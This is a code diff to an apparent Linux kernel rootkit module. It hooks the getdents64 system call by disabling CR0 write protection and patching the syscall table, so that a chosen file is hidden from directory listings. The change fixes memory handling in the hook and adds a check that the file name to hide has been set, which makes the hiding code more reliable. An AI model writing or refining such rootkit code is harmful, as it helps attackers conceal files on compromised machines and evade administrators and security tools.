@@ -30,21 +30,19 @@ static inline void one_cr0(void) {
 
 int new_getdents64(const struct pt_regs *regs) {
     int total_bytes_read = original_getdents64_ptr(regs);
-    void *buff_pointer = (void*)regs->si;
-
-    bool has_been_found = false;
-    void *first;
 
     if (total_bytes_read > 0) {
-        first = kmalloc(total_bytes_read, GFP_KERNEL);
+        void *buff_pointer = (void*)regs->si;
+        bool has_been_found = false;
+        void *first = kmalloc(total_bytes_read, GFP_KERNEL);
 
-        int copy_res = copy_from_user((void *)first, buff_pointer, (unsigned long)total_bytes_read);
+        int copy_res = copy_from_user(first, buff_pointer, (unsigned long)total_bytes_read);
         if (copy_res) {
             printk(KERN_ALERT "Error while copying from user space! error %d", copy_res);
             return total_bytes_read;
         }
 
-        struct linux_dirent64 * curr = first;
+        struct linux_dirent64 *curr = first;
 
         int i = 0;
         while ((i < total_bytes_read) && (curr->d_reclen > 0)) {   
@@ -64,17 +62,23 @@ int new_getdents64(const struct pt_regs *regs) {
 
             i += curr->d_reclen;
         }
+
+        if (has_been_found) {
+            copy_to_user(buff_pointer, first, total_bytes_read);
+        }
+
+        kfree(first);
     }
 
-    if (has_been_found) {
-        copy_to_user(buff_pointer, first, total_bytes_read);
-    }
-
-    kfree(first);
     return total_bytes_read;
 }
  
 int load(void) {
+    if (file_name_to_hide == NULL) {
+        printk(KERN_ALERT "File name to hide has not been set! Exiting...");
+        return -1;
+    }
+
     printk(KERN_ALERT "Initializing...");
     zero_cr0();
     syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
